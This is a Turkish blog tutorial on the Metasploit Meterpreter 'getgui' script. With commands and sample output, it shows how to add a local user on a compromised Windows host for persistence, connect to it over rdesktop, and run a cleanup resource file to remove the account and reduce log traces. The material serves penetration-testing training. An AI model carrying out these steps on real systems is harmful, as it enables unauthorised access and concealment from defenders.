---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-05-05T13:30:00Z"
excerpt: Metasploit Framework içerisinde Meterpreter ile bir shell açtığınızda yapılabilecek
  işlemlerden bir tanesi de uzak masaüstü bağlantısını hayata geçirmek olabilir. Bunun
  içingetguikomutu oldukça kullanışlıdır.
guid: https://www.siberoloji.com/?p=1187
id: 1187
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Remote Desktop Modülü
url: /tr/msf-remote-desktop-modulu/
---

  Metasploit Framework içerisinde Meterpreter ile bir shell açtığınızda yapılabilecek işlemlerden bir tanesi de uzak masaüstü bağlantısını hayata geçirmek olabilir. Bunun için&nbsp;<code>getgui</code>&nbsp;komutu oldukça kullanışlıdır. 
 

  Bu yazımızda&nbsp;<code>getgui</code>&nbsp;komutunu kullanarak sistemde bir kullanıcı oluşturup ardından&nbsp;<code>rdesktop</code>&nbsp;komutu ile bu bilgisayara nasıl bağlanabileceğimizi göreceğiz. 
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="uzak-masaüstü-bağlantısı">Uzak Masaüstü Bağlantısı 
<!-- /wp:heading -->

  Hedef bilgisayarda Meterpreter shell açtığınızı varsayıyoruz. Şimdi işe&nbsp;<code>getgui</code>&nbsp;komutunu kullanarak görsel bağlantı sağlamak için gerekli olan kullanıcı adı ve parolaya ihtiyacımız var. Böyle bir kullanıcı adı ve parolası oluşturduğunuzda kalıcılık sağlamış olursunuz. 
 

 
<h2 class="wp-block-heading" id="getgui-aracı"><code>getgui</code>&nbsp;Aracı
<!-- /wp:heading -->

  Öncelikle&nbsp;<code>getgui</code>&nbsp;yardım başlıklarına bakalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run getgui -h
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u  -p 
Or:    getgui -e

OPTIONS:

    -e   Enable RDP only.
    -f   Forward RDP Connection.
    -h   Help menu.
    -l   The language switch
         Possible Options: 'de_DE', 'en_EN' / default is: 'en_EN'
    -p   The Password of the user
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="getgui-kullanıcı-ekleme"><code>getgui</code>&nbsp;Kullanıcı Ekleme
<!-- /wp:heading -->

  Genel olarak kullanımda&nbsp;<code>-u</code>&nbsp;kullanıcı adını,&nbsp;<code>-p</code>&nbsp;parolayı belirtmek için kullanılır.&nbsp;<code>getgui</code>&nbsp;komutunu aşağıdaki örneğe benzer şekilde kullandığınızda sisteme yeni bir kullanıcı eklemiş olursunuz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run getgui -u loneferret -p password
***[*** ******* ***]***  Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
***[*** ******* ***]***  Carlos Perez carlos_perez@darkoperator.com
***[*** ******* ***]***  Language detection started
***[*** ******* ***]***    Language detected: en_US
***[*** ******* ***]***  Setting user account ***for *** logon
***[*** ******* ***]***    Adding User: loneferret with Password: password
***[*** ******* ***]***    Adding User: loneferret to local group ''
***[*** ******* ***]***    Adding User: loneferret to local group ''
***[*** ******* ***]***  You can now login with the created user
***[*** ******* ***]***  For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="rdesktop-bağlantısı"><code>rdesktop</code>&nbsp;Bağlantısı
<!-- /wp:heading -->

  Artık kullanıcı oluşturuldu. Aynı ağda bulunan başka bir bilgisayardan, bu kullanıcı adı ve parolayı kullanarak uzak masaüstü bağlantısı yapabilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~#: rdesktop -u loneferret -p password 192.168.101.108
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="log-temizleme">Log Temizleme 
<!-- /wp:heading -->

  Hedef sistemde ne kadar çok oynama yaparsanız, log kayıtlarına kaydedilme ihtimaliniz de o kadar artar. Bu sebeple mümkün olduğunca yetkisiz işlem yapmamalı veya gereken yerlere müdahale etmekle yetinmelisiniz. 
 

  <code>getgui</code>&nbsp;ile oluşturduğunuz kullanıcı ve oturum bilgilerini log kayıtların temizlemek isteyebilirsiniz. Bunun için aşağıdaki komut örneği işinize yarayacaktır. Örnekte kullanılan&nbsp;<code>/root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc</code>&nbsp;dosyasının en güncel halini yine aynı klasör içinden kontrol edebilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
***[*** ******* ***]***  Running Command List ...
***[*** ******* ***]***    Running command execute -H -f cmd.exe -a "/c net user hacker /delete"
Process 288 created.
meterpreter ***&gt;*** </code></pre>
<!-- /wp:code -->